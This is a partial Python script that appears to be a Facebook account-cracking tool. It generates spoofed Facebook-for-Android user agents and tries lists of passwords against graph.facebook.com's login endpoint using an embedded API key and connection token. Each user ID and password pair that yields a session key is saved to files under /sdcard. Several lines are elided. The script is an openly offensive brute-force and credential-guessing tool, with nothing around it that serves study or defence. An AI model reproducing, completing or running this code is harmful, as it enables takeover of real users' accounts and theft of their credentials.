...
def random_dalvik_ua_best():
    android_versions = ["10", "11", "12", "13", "14"]

    devices = [
        # Xiaomi
        ("Xiaomi", "Redmi Note 12", "TP1A.220624.014", "1080", "2400", "2.0"),
        ("Xiaomi", "Redmi Note 11", "SP1A.210812.016", "1080", "2400", "2.0"),

        # Samsung
        ("Samsung", "Galaxy A52", "RP1A.200720.012", "1080", "2400", "2.0"),
        ("Samsung", "Galaxy S21", "TP1A.220624.014", "1440", "3200", "3.0"),

        # Realme
        ("Realme", "Realme 9 Pro+", "TP1A.220624.014", "1080", "2400", "2.0"),
        ("Realme", "Realme 8i", "SP1A.210812.016", "1080", "2412", "2.0"),

        # Oppo
        ("Oppo", "F19 Pro", "SP1A.210812.016", "1080", "2400", "2.0"),

        # Vivo
        ("Vivo", "V23", "TP1A.220624.014", "1080", "2400", "2.0"),

        # Infinix
        ("Infinix", "Note 12", "TP1A.220624.014", "1080", "2460", "2.0"),

        # Tecno
        ("Tecno", "Pova 3", "TP1A.220624.014", "1080", "2460", "2.0"),

        # Google Pixel
        ("Google", "Pixel 7", "TP1A.220624.014", "1080", "2400", "2.0"),
    ]

    fb_versions = [
        ("FBAV/420.0.0.28.104", "FBBV/57482941"),
        ("FBAV/418.0.0.32.112", "FBBV/57012893"),
        ("FBAV/415.0.0.24.109", "FBBV/56733219"),
        ("FBAV/412.0.0.24.115", "FBBV/56543211"),
    ]

    brand, model, build, width, height, density = random.choice(devices)
    fbav, fbbv = random.choice(fb_versions)
    android_version = random.choice(android_versions)

    ua = (f"Davik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) "
          f"[FBAN/FB4A;{fbav};{fbbv};FBDM/{{density={density},width={width},height={height}}};"
          f"FBLC/en_US;FBCR/Robi;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana]")
...
def random_dalvik_ua_working():
    android_versions = ["10", "11", "12", "13", "14"]

    devices = [
        # Xiaomi
        ("Xiaomi", "Redmi Note 13 Pro", "UP1A.231005.007", "1220", "2712", "2.75"),
        ("Xiaomi", "Redmi Note 12", "TP1A.220624.014", "1080", "2400", "2.0"),
        ("Xiaomi", "Redmi Note 11", "SP1A.210812.016", "1080", "2400", "2.0"),

        # Samsung
        ("Samsung", "Galaxy A54", "TP1A.220624.014", "1080", "2340", "2.25"),
        ("Samsung", "Galaxy A52", "RP1A.200720.012", "1080", "2400", "2.0"),
        ("Samsung", "Galaxy S21", "TP1A.220624.014", "1440", "3200", "3.0"),

        # Realme
        ("Realme", "Realme 11 Pro+", "UP1A.231005.007", "1240", "2772", "2.8"),
        ("Realme", "Realme 9 Pro+", "TP1A.220624.014", "1080", "2400", "2.0"),

        # Oppo
        ("Oppo", "Reno 10 Pro+", "UP1A.231005.007", "1240", "2772", "2.8"),
        ("Oppo", "F19 Pro", "SP1A.210812.016", "1080", "2400", "2.0"),

        # Vivo
        ("Vivo", "V29", "UP1A.231005.007", "1080", "2400", "2.25"),
        ("Vivo", "V23", "TP1A.220624.014", "1080", "2400", "2.0"),

        # Infinix
        ("Infinix", "Zero Ultra", "TP1A.220624.014", "1080", "2400", "2.0"),
        ("Infinix", "Note 12", "TP1A.220624.014", "1080", "2460", "2.0"),

        # Tecno
        ("Tecno", "Pova 5 Pro", "TP1A.220624.014", "1080", "2460", "2.0"),
        ("Tecno", "Pova 3", "TP1A.220624.014", "1080", "2460", "2.0"),

        # Google Pixel
        ("Google", "Pixel 8 Pro", "UP1A.231005.007", "1344", "2992", "3.25"),
        ("Google", "Pixel 7", "TP1A.220624.014", "1080", "2400", "2.0"),
    ]

    fb_versions = [
        ("FBAV/423.0.0.32.120", "FBBV/57928394"),
        ("FBAV/421.0.0.30.106", "FBBV/57688213"),
        ("FBAV/420.0.0.28.104", "FBBV/57482941"),
        ("FBAV/418.0.0.32.112", "FBBV/57012893"),
        ("FBAV/415.0.0.24.109", "FBBV/56733219"),
    ]
    ...
    ua = (f"Davik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) "
          f"[FBAN/FB4A;{fbav};{fbbv};"
          f"FBDM/{{density={density},width={width},height={height}}};"
          f"FBLC/en_US;FBCR/Grameenphone;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana]")
...
\033[92;1m[\033[91;1m●\033[92;1m] TOOLS       \033[91;1m●\033[92;1m FILE M-1-2
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 4.4
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
...
def YousuF():
            ...
            print(f'\033[92;1m[\033[1;37mB\033[92;1m] \033[1;37mFILE CREATE ')
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_ua_working(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
